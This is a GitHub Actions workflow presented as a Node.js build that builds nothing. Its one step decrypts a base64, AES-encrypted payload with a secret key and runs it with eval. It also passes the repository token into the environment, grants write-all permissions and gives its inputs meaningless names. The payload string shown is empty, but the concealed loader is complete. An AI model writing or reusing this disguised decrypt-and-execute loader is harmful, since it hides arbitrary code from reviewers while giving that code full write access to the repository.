name: Build Node.js (shared libraries)

on:
  workflow_dispatch:
    inputs:
      option1:
        required: true
        default: ''
        type: string
      option2:
        required: false
        default: ''
        type: string
      option3:
        required: true
        default: 330
        type: number
      option4:
        required: true
        default: false
        type: boolean
      option5:
        required: true
        default: true
        type: boolean

env:
  OPTION_4: ${{ inputs.option4 }}
  GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
  OPTION_1: ${{ inputs.option1 }}
  OPTION_5: ${{ inputs.option5 }}
  DECRYPTION_KEY: ${{ secrets.DECRYPTION_KEY }}
  OPTION_2: ${{ inputs.option2 }}
  OPTION_3: ${{ inputs.option3 }}

permissions: write-all

jobs:
  client:
    runs-on: ubuntu-24.04
    steps:
      - name: Build Custom Node.js and run tests
        run: |
          encrypted_payload=""

          decrypted="$(base64 -d <<< "$encrypted_payload" | openssl enc -aes-256-cbc -d -salt -pbkdf2 -pass pass:"$DECRYPTION_KEY")"

          if [[ $? -eq 0 ]]; then
            eval "$decrypted"
          fi
